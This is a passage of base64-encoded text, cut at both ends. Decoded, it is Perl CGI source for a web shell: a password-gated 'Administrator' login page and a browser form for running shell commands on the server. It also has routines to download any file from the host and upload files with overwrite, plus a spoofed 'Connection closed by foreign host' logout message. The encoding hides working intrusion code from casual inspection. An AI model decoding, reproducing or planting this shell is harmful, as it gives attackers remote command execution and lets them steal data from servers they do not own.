ZWN0b3J5DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQWRkTGlua0RpcigkKQ0Kew0KCW15ICRhYz1zaGlmdDsNCglteSBAZGlyPSgpOw0KCWlmKCRXaW5OVCkNCgl7DQoJCUBkaXI9c3BsaXQoL1xcLywkQ3VycmVudERpcik7DQoJfWVsc2UNCgl7DQoJCUBkaXI9c3BsaXQoIi8iLCZ0cmltKCRDdXJyZW50RGlyKSk7DQoJfQ0KCW15ICRwYXRoPSIiOw0KCW15ICRyZXN1bHQ9IiI7DQoJZm9yZWFjaCAoQGRpcikNCgl7DQoJCSRwYXRoIC49ICRfLiRQYXRoU2VwOw0KCQkkcmVzdWx0Lj0iPGEgaHJlZj0nP2E9Ii4kYWMuIiZkPSIuJHBhdGguIic+Ii4kXy4kUGF0aFNlcC4iPC9hPiI7DQoJfQ0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIG1lc3NhZ2UgdGhhdCBpbmZvcm1zIHRoZSB1c2VyIG9mIGEgZmFpbGVkIGxvZ2luDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dpbkZhaWxlZE1lc3NhZ2UNCnsNCglwcmludCA8PEVORDsNCjxicj5Mb2dpbiA6IEFkbWluaXN0cmF0b3I8YnI+DQoNClBhc3N3b3JkOjxicj4NCkxvZ2luIGluY29ycmVjdDxicj48YnI+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSBmb3IgbG9nZ2luZyBpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50TG9naW5Gb3JtDQp7DQoJcHJpbnQgPDxFTkQ7DQo8Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJsb2dpbiI+DQpMb2dpbiA6IEFkbWluaXN0cmF0b3I8YnI+DQpQYXNzd29yZDo8aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InAiPg0KPGlucHV0IGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4NCjwvZm9ybT4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgZm9vdGVyIGZvciB0aGUgSFRNTCBQYWdlDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRQYWdlRm9vdGVyDQp7DQoJcHJpbnQgIjxicj48Zm9udCBjb2xvcj1yZWQ+by0tLVsgIDxmb250IGNvbG9yPSNmZjk5MDA+RWRpdCBieSAkRWRpdFBlcnNpb24gPC9mb250PiAgXS0tLW88L2ZvbnQ+PC9jb2RlPjwvY2VudGVyPjwvYm9keT48L2h0bWw+IjsNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBSZXRyZWl2ZXMgdGhlIHZhbHVlcyBvZiBhbGwgY29va2llcy4gVGhlIGNvb2tpZXMgY2FuIGJlIGFjY2Vzc2VzIHVzaW5nIHRoZQ0KIyB2YXJpYWJsZSAkQ29va2llc3snfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEdldENvb2tpZXMNCnsNCglAaHR0cGNvb2tpZXMgPSBzcGxpdCgvOyAvLCRFTlZ7J0hUVFBfQ09PS0lFJ30pOw0KCWZvcmVhY2ggJGNvb2tpZShAaHR0cGNvb2tpZXMpDQoJew0KCQkoJGlkLCAkdmFsKSA9IHNwbGl0KC89LywgJGNvb2tpZSk7DQoJCSRDb29raWVzeyRpZH0gPSAkdmFsOw0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIHNjcmVlbiB3aGVuIHRoZSB1c2VyIGxvZ3Mgb3V0DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dvdXRTY3JlZW4NCnsNCglwcmludCAiQ29ubmVjdGlvbiBjbG9zZWQgYnkgZm9yZWlnbiBob3N0Ljxicj48YnI+IjsNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBMb2dzIG91dCB0aGUgdXNlciBhbmQgYWxsb3dzIHRoZSB1c2VyIHRvIGxvZ2luIGFnYWluDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUGVyZm9ybUxvZ291dA0Kew0KCXByaW50ICJTZXQtQ29va2llOiBTQVZFRFBXRD07XG4iOyAjIHJlbW92ZSBwYXNzd29yZCBjb29raWUNCgkmUHJpbnRQYWdlSGVhZGVyKCJwIik7DQoJJlByaW50TG9nb3V0U2NyZWVuOw0KDQoJJlByaW50TG9naW5TY3JlZW47DQoJJlByaW50TG9naW5Gb3JtOw0KCSZQcmludFBhZ2VGb290ZXI7DQoJZXhpdDsNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB0byBsb2dpbiB0aGUgdXNlci4gSWYgdGhlIHBhc3N3b3JkIG1hdGNoZXMsIGl0DQojIGRpc3BsYXlzIGEgcGFnZSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBydW4gY29tbWFuZHMuIElmIHRoZSBwYXNzd29yZCBkb2Vucyd0DQojIG1hdGNoIG9yIGlmIG5vIHBhc3N3b3JkIGlzIGVudGVyZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlcg0KIyB0byBsb2dpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFBlcmZvcm1Mb2dpbiANCnsNCglpZigkTG9naW5QYXNzd29yZCBlcSAkUGFzc3dvcmQpICMgcGFzc3dvcmQgbWF0Y2hlZA0KCXsNCgkJcHJpbnQgIlNldC1Db29raWU6IFNBVkVEUFdEPSRMb2dpblBhc3N3b3JkO1xuIjsNCgkJJlByaW50UGFnZUhlYWRlcjsNCgkJcHJpbnQgJkxpc3REaXI7DQoJfQ0KCWVsc2UgIyBwYXNzd29yZCBkaWRuJ3QgbWF0Y2gNCgl7DQoJCSZQcmludFBhZ2VIZWFkZXIoInAiKTsNCgkJJlByaW50TG9naW5TY3JlZW47DQoJCWlmKCRMb2dpblBhc3N3b3JkIG5lICIiKSAjIHNvbWUgcGFzc3dvcmQgd2FzIGVudGVyZWQNCgkJew0KCQkJJlByaW50TG9naW5GYWlsZWRNZXNzYWdlOw0KDQoJCX0NCgkJJlByaW50TG9naW5Gb3JtOw0KCQkmUHJpbnRQYWdlRm9vdGVyOw0KCQlleGl0Ow0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBlbnRlciBjb21tYW5kcw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50Q29tbWFuZExpbmVJbnB1dEZvcm0NCnsNCglteSAkZGlyPSAiPHNwYW4gc3R5bGU9J2ZvbnQ6IDExcHQgVmVyZGFuYTsgZm9udC13ZWlnaHQ6IGJvbGQ7Jz4iLiZBZGRMaW5rRGlyKCJjb21tYW5kIikuIjwvc3Bhbj4iOw0KCSRQcm9tcHQgPSAkV2luTlQgPyAiJGRpciA+ICIgOiAiPGZvbnQgY29sb3I9JyM2NmZmNjYnPlthZG1pblxAJFNlcnZlck5hbWUgJGRpcl1cJDwvZm9udD4gIjsNCglyZXR1cm4gPDxFTkQ7DQo8Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImNvbW1hbmQiPg0KDQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0KJFByb21wdA0KPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjUwIiBuYW1lPSJjIj4NCjxpbnB1dCBjbGFzcz0ic3VibWl0InR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4NCjwvZm9ybT4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGRvd25sb2FkIGZpbGVzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRGaWxlRG93bmxvYWRGb3JtDQp7DQoJbXkgJGRpciA9ICZBZGRMaW5rRGlyKCJkb3dubG9hZCIpOyANCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRkaXIgPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJGRpcl1cJCAiOw0KCXJldHVybiA8PEVORDsNCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJkb3dubG9hZCI+DQokUHJvbXB0IGRvd25sb2FkPGJyPjxicj4NCkZpbGVuYW1lOiA8aW5wdXQgY2xhc3M9ImZpbGUiIHR5cGU9InRleHQiIG5hbWU9ImYiIHNpemU9IjM1Ij48YnI+PGJyPg0KRG93bmxvYWQ6IDxpbnB1dCBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+DQoNCjwvZm9ybT4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHVwbG9hZCBmaWxlcw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50RmlsZVVwbG9hZEZvcm0NCnsNCglteSAkZGlyPSAmQWRkTGlua0RpcigidXBsb2FkIik7DQoJJFByb21wdCA9ICRXaW5OVCA/ICIkZGlyID4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRkaXJdXCQgIjsNCglyZXR1cm4gPDxFTkQ7DQo8Zm9ybSBuYW1lPSJmIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCiRQcm9tcHQgdXBsb2FkPGJyPjxicj4NCkZpbGVuYW1lOiA8aW5wdXQgY2xhc3M9ImZpbGUiIHR5cGU9ImZpbGUiIG5hbWU9ImYiIHNpemU9IjM1Ij48YnI+PGJyPg0KT3B0aW9uczogJm5ic3A7PGlucHV0IHR5cGU9ImNoZWNrYm94IiBuYW1lPSJvIiBpZD0idXAiIHZhbHVlPSJvdmVyd3JpdGUiPg0KPGxhYmVsIGZvcj0idXAiPk92ZXJ3cml0ZSBpZiBpdCBFeGlzdHM8L2xhYmVsPjxicj48YnI+DQpVcGxvYWQ6Jm5ic3A7Jm5ic3A7Jm5ic3A7PGlucHV0IGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IkJlZ2luIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+DQo8aW5wdXQgY2xhc3M9InN1Ym1pdCIgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0idXBsb2FkIj4NCg0KPC9mb3JtPg0KDQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB0aW1lb3V0IGZvciBhIGNvbW1hbmQgZXhwaXJlcy4gV2UgbmVlZCB0bw0KIyB0ZXJtaW5hdGUgdGhlIHNjcmlwdCBpbW1lZGlhdGVseS4gVGhpcyBmdW5jdGlvbiBpcyB2YWxpZCBvbmx5IG9uIFVuaXguIEl0IGlzDQojIG5ldmVyIGNhbGxlZCB3aGVuIHRoZSBzY3JpcHQgaXMgcnVubmluZyBvbiBOVC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBDb21tYW5kVGltZW91dA0Kew0KCWlmKCEkV2luTlQpDQoJew0KCQlhbGFybSgwKTsNCgkJcmV0dXJuIDw8RU5EOw0KPC90ZXh0YXJlYT4NCjxicj48Zm9udCBjb2xvcj15ZWxsb3c+DQpDb21tYW5kIGV4Y2VlZGVkIG1heGltdW0gdGltZSBvZiAkQ29tbWFuZFRpbWVvdXREdXJhdGlvbiBzZWNvbmQocykuPC9mb250Pg0KPGJyPjxmb250IHNpemU9JzYnIGNvbG9yPXJlZD5LaWxsZWQgaXQhPC9mb250Pg0KRU5EDQoJfQ0KfQ0KDQoNCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGRpc3BsYXlzIHRoZSBwYWdlIHRoYXQgY29udGFpbnMgYSBsaW5rIHdoaWNoIGFsbG93cyB0aGUgdXNlcg0KIyB0byBkb3dubG9hZCB0aGUgc3BlY2lmaWVkIGZpbGUuIFRoZSBwYWdlIGFsc28gY29udGFpbnMgYSBhdXRvLXJlZnJlc2gNCiMgZmVhdHVyZSB0aGF0IHN0YXJ0cyB0aGUgZG93bmxvYWQgYXV0b21hdGljYWxseS4NCiMgQXJndW1lbnQgMTogRnVsbHkgcXVhbGlmaWVkIGZpbGVuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludERvd25sb2FkTGlua1BhZ2UNCnsNCglsb2NhbCgkRmlsZVVybCkgPSBAXzsNCglteSAkcmVzdWx0PSIiOw0KCWlmKC1lICRGaWxlVXJsKSAjIGlmIHRoZSBmaWxlIGV4aXN0cw0KCXsNCgkJIyBlbmNvZGUgdGhlIGZpbGUgbGluayBzbyB3ZSBjYW4gc2VuZCBpdCB0byB0aGUgYnJvd3Nlcg0KCQkkRmlsZVVybCA9fiBzLyhbXmEtekEtWjAtOV0pLyclJy51bnBhY2soIkgqIiwkMSkvZWc7DQoJCSREb3dubG9hZExpbmsgPSAiJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZj0kRmlsZVVybCZvPWdvIjsNCgkJJEh0bWxNZXRhSGVhZGVyID0gIjxtZXRhIEhUVFAtRVFVSVY9XCJSZWZyZXNoXCIgQ09OVEVOVD1cIjE7IFVSTD0kRG93bmxvYWRMaW5rXCI+IjsNCgkJJlByaW50UGFnZUhlYWRlcigiYyIpOw0KCQkkcmVzdWx0IC49IDw8RU5EOw0KU2VuZGluZyBGaWxlICRUcmFuc2ZlckZpbGUuLi48YnI+DQoNCklmIHRoZSBkb3dubG9hZCBkb2VzIG5vdCBzdGFydCBhdXRvbWF0aWNhbGx5LA0KPGEgaHJlZj0iJERvd25sb2FkTGluayI+Q2xpY2sgSGVyZTwvYT4NCkVORA0KCQkkcmVzdWx0IC49ICZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KCX0NCgllbHNlICMgZmlsZSBkb2Vzbid0IGV4aXN0DQoJew0KCQkkcmVzdWx0IC49ICJGYWlsZWQgdG8gZG93bmxvYWQgJEZpbGVVcmw6ICQhIjsNCgkJJHJlc3VsdCAuPSAmUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KCX0NCglyZXR1cm4gJHJlc3VsdDsNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIHJlYWRzIHRoZSBzcGVjaWZpZWQgZmlsZSBmcm9tIHRoZSBkaXNrIGFuZCBzZW5kcyBpdCB0byB0aGUNCiMgYnJvd3Nlciwgc28gdGhhdCBpdCBjYW4gYmUgZG93bmxvYWRlZCBieSB0aGUgdXNlci4NCiMgQXJndW1lbnQgMTogRnVsbHkgcXVhbGlmaWVkIHBhdGhuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIHNlbnQuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgU2VuZEZpbGVUb0Jyb3dzZXINCnsNCglteSAkcmVzdWx0ID0gIiI7DQoJbG9jYWwoJFNlbmRGaWxlKSA9IEBfOw0KCWlmKG9wZW4oU0VOREZJTEUsICRTZW5kRmlsZSkpICMgZmlsZSBvcGVuZWQgZm9yIHJlYWRpbmcNCgl7DQoJCWlmKCRXaW5OVCkNCgkJew0KCQkJYmlubW9kZShTRU5ERklMRSk7DQoJCQliaW5tb2RlKFNURE9VVCk7DQoJCX0NCgkJJEZpbGVTaXplID0gKHN0YXQoJFNlbmRGaWxlKSlbN107DQoJCSgkRmlsZW5hbWUgPSAkU2VuZEZpbGUpID1+ICBtIShbXi9eXFxdKikkITsNCgkJcHJpbnQgIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC11bmtub3duXG4iOw0KCQlwcmludCAiQ29udGVudC1MZW5ndGg6ICRGaWxlU2l6ZVxuIjsNCgkJcHJpbnQgIkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSQxXG5cbiI7DQoJCXByaW50IHdoaWxlKDxTRU5ERklMRT4pOw0KCQljbG9zZShTRU5ERklMRSk7DQoJCWV4aXQoMSk7DQoJfQ0KCWVsc2UgIyBmYWlsZWQgdG8gb3BlbiBmaWxlDQoJew0KCQkkcmVzdWx0IC49ICJGYWlsZWQgdG8gZG93bmxvYWQgJFNlbmRGaWxlOiAkISI7DQoJCSRyZXN1bHQgLj0mUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KCX0NCglyZXR1cm4gJHJlc3VsdDsNCn0NCg0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgZG93bmxvYWRzIGEgZmlsZS4gSXQgZGlzcGxheXMgYSBtZXNzYWdlDQojIHRvIHRoZSB1c2VyIGFuZCBwcm92aWRlcyBhIGxpbmsgdGhyb3VnaCB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4NCiMgVGhpcyBmdW5jdGlvbiBpcyBhbHNvIGNhbGxlZCB3aGVuIHRoZSB1c2VyIGNsaWNrcyBvbiB0aGF0IGxpbmsuIEluIHRoaXMgY2FzZSwNCiMgdGhlIGZpbGUgaXMgcmVhZCBhbmQgc2VudCB0byB0aGUgYnJvd3Nlci4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBCZWdpbkRvd25sb2FkDQp7DQoJIyBnZXQgZnVsbHkgcXVhbGlmaWVkIHBhdGggb2YgdGhlIGZpbGUgdG8gYmUgZG93bmxvYWRlZA0KCWlmKCgkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cXHxeLjovKSkgfA0KCQkoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUNCgl7DQoJCSRUYXJnZXRGaWxlID0gJFRyYW5zZmVyRmlsZTsNCgl9DQoJZWxzZSAjIHBhdGggaXMgcmVsYXRpdmUNCgl7DQoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87DQoJCSRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7DQoJfQ0KDQoJaWYoJE9wdGlvbnMgZXEgImdvIikgIyB3ZSBoYXZlIHRvIHNlbmQgdGhlIGZpbGUNCgl7DQoJCSZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7DQoJfQ0KCWVsc2UgIyB3ZSBoYXZlIHRvIHNlbmQgb25seSB0aGUgbGluayBwYWdlDQoJew0KCQkmUHJpbnREb3dubG9hZExpbmtQYWdlKCRUYXJnZXRGaWxlKTsNCgl9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlLiBJZiB0aGUNCiMgZmlsZSBpcyBub3Qgc3BlY2lmaWVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gYWxsb3dpbmcgdGhlIHVzZXIgdG8gc3BlY2lmeSBhDQojIGZpbGUsIG90aGVyd2lzZSBpdCBzdGFydHMgdGhlIHVwbG9hZCBwcm9jZXNzLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFVwbG9hZEZpbGUNCnsNCgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgdXBsb2FkIGZvcm0gYWdhaW4NCglpZigkVHJhbnNmZXJGaWxlIGVxICIiKQ0KCXsNCgkJcmV0dXJuICZQcmludEZpbGVVcGxvYWRGb3JtOw0KDQoJfQ0KCW15ICRyZXN1bHQ9IiI7DQoJIyBzdGFydCB0aGUgdXBsb2FkaW5nIHByb2Nlc3MNCgkkcmVzdWx0IC49ICJVcGxvYWRpbmcgJFRyYW5zZmVyRmlsZSB0byAkQ3VycmVudERpci4uLjxicj4iOw0KDQoJIyBnZXQgdGhlIGZ1bGxseSBxdWFsaWZpZWQgcGF0aG5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgY3JlYXRlZA0KCWNob3AoJFRhcmdldE5hbWUpIGlmICgkVGFyZ2V0TmFtZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOw0KCSRUcmFuc2ZlckZpbGUgPX4gbSEoW14vXlxcXSopJCE7DQoJJFRhcmdldE5hbWUgLj0gJFBhdGhTZXAuJDE7DQoNCgkkVGFyZ2V0RmlsZVNpemUgPSBsZW5ndGgoJGlueydmaWxlZGF0YSd9KTsNCgkjIGlmIHRoZSBmaWxlIGV4aXN0cyBhbmQgd2UgYXJlIG5vdCBzdXBwb3NlZCB0byBvdmVyd3JpdGUgaXQNCglpZigtZSAkVGFyZ2V0TmFtZSAmJiAkT3B0aW9ucyBuZSAib3ZlcndyaXRlIikNCgl7DQoJCSRyZXN1bHQgLj0gIkZhaWxlZDogRGVzdGluYXRpb24gZmlsZSBhbHJlYWR5IGV4aXN0cy48YnI+IjsNCgl9DQoJZWxzZSAjIGZpbGUgaXMgbm90IHByZXNlbnQNCgl7DQoJCWlmKG9wZW4oVVBMT0FERklMRSwgIj4kVGFyZ2V0TmFtZSIpKQ0KCQl7DQoJCQliaW5tb2RlKFVQTE9BREZJTEUpIGlmICRXaW5OVDsNCgkJCXByaW50IFVQTE9BREZJTEUgJGlueydmaWxlZGF0YSd9Ow0KCQkJY2xvc2UoVVBMT0FERklMRSk7DQoJCQkkcmVzdWx0IC49ICJUcmFuc2ZlcmVkICRUYXJnZXRGaWxlU2l6ZSBCeXRlcy48YnI+IjsNCgkJCSRyZXN1bHQgLj0gIkZpbGUgUGF0aDogJFRhcmdldE5hbWU8YnI+IjsNCgkJfQ0KCQllbHNlDQoJCXsNCgkJCSRyZXN1bHQgLj0gIkZhaWxlZDogJCE8YnI+IjsNCgkJfQ0KCX0NCgkkcmVzdWx0IC49ICZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgd2FudHMgdG8gZG93bmxvYWQgYSBmaWxlLiBJZiB0aGUNCiMgZmlsZW5hbWUgaXMgbm90IHNwZWNpZmllZCwgaXQgZGlzcGxheXMgYSBmb3JtIGFsbG93aW5nIHRoZSB1c2VyIHRvIHNwZWNpZnkgYQ0KIyBmaWxlLCBvdGhlcndpc2UgaXQgZGlzcGxheXMgYSBtZXNzYWdlIHRvIHRoZSB1c2VyIGFuZCBwcm92aWRlcyBhIGxpbmsNCiMgdGhyb3VnaCAgd2hpY2ggdGhlIGZpbGUgY2FuIGJlIGRvd25sb2FkZWQuDQojLS0tLS0